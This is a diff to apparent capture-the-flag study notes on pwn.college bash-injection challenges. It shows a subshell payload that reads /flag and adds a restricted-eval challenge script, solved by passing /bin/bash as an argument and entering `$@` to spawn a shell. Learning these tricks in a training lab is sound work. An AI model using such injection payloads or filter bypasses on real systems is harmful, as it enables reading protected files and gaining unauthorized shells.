@@ -41,3 +41,25 @@
 
 ## Subshell Attack with extra bracket
 - `a[\$(</flag))]` (extra ')')
+
+---
+
+# Module 3
+## Rhythm of Restriction
+
+```sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+
+read INPUT < <(head -n1 | tr -d "[A-Za-z0-9/]")
+eval "$INPUT"
+```
+
+### Solution
+```sh
+/challenge/run /bin/bash
+$@
+```
+
+
